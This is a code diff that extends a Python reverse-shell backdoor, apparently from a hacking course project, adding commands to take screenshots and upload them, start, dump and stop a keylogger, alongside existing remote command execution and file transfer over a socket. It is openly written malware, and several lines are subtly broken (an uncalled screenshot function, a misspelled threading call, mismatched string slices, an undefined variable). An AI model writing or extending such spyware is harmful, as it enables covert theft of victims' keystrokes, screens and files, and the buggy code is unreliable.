@@ -1,4 +1,5 @@
-import socket, json, subprocess, os
+import socket, json, subprocess, os, pyautogui, keylogger, threading
+from termcolor import colored
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -33,6 +34,10 @@ def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
 
+def screenshot():
+    myscreenshot = pyautogui.screenshot
+    myscreenshot.save('screenshot.png')
+
 def shell():
     while True:
         command = reliable_recv()
@@ -48,6 +53,22 @@ def shell():
             download_file(command[:7])
         elif command[:8] == 'download':
             upload_file(command[9:])
+        elif command[:10] == 'screenshot':
+            screenshot()
+            upload_file('screenshot.png')
+            os.remove('screenshot.png')
+        elif command[:12] == 'keylogger':
+            keylog = keylogger.Keylogger()
+            t = threading.Tread(target=keylog.start)
+            t.start()
+            reliable_send(colored('[+] keylogger started', 'green'))
+        elif command[:11] == 'keylog_dump':
+            logs = keylog.read_logs()
+            reliable_send(logs)
+        elif command[:11] == 'keylog_stop':
+            keylog.self_destruct()
+            t.join()
+            reliable_send(colored('[+] keylogger stopped', 'green'))
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
